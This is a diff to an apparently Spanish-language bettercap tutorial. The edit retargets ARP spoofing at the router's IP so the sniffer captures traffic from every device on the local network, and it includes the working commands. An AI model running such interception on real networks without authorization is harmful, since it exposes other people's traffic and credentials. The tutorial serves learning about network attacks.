@@ -43,7 +43,7 @@ Como podmeos observar son las IP de nuestra red local.
 
 <br>
 
-En la misma terminal ejecutaremos de nuevo bettercap, seleccionamos la IP que vamos analizár.
+En la misma terminal ejecutaremos de nuevo bettercap, seleccionamos la IP que vamos analizár en este caso vamos a nalizar todas las IP para esto seleccionamos la IP del router.
 
 ```
 set arp.spoof targets 192.168.1.1
@@ -55,7 +55,7 @@ set net.sniff.verbose false
 net.sniff on
 ```
 
-Y nos mostrara todo el tráfico de la IP seleccionada.
+Y nos mostrara todo el tráfico de todos los dispositivos.
 
 <br>
 
